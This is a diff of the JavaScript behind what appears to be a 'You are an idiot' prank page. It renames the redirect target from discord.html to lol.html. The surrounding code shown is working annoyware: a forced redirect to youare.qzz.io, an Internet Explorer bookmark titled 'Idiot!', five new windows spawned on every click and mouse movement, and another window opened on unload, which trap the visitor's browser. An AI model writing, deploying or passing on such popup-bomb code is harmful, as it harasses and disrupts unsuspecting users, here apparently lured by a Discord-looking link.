@@ -1,6 +1,6 @@
 function checkAndRedirect() {
-    if (document.hasFocus() && !window.location.pathname.includes('/discord.html')) {
-        window.location.href = 'https://youare.qzz.io/discord.html';
+    if (document.hasFocus() && !window.location.pathname.includes('/lol.html')) {
+        window.location.href = 'https://youare.qzz.io/lol.html';
     }
 }
 checkAndRedirect();
@@ -23,7 +23,7 @@ faudio.addEventListener('timeupdate', function () {
 });  
 function bookmark() {  
     if (navigator.appName === "Microsoft Internet Explorer" && parseInt(navigator.appVersion) >= 4) {  
-        window.external.AddFavorite("discord.html", "‎‎Idiot!");  
+        window.external.AddFavorite("lol.html", "‎‎Idiot!");  
     }  
 }  
   
@@ -69,7 +69,7 @@ function openWindow(url) {
 }
 function proCreate() {
     for (let i = 0; i < 5; i++) {
-        openWindow("discord.html");
+        openWindow("lol.html");
     }
 }
 
@@ -191,7 +191,7 @@ window.onkeydown = function (event) {
 };
 window.addEventListener("unload", function () {
    // proCreate();
-    openWindow("discord.html");
+    openWindow("lol.html");
 });
 document.onclick=proCreate;
 document.onmousemove=proCreate;
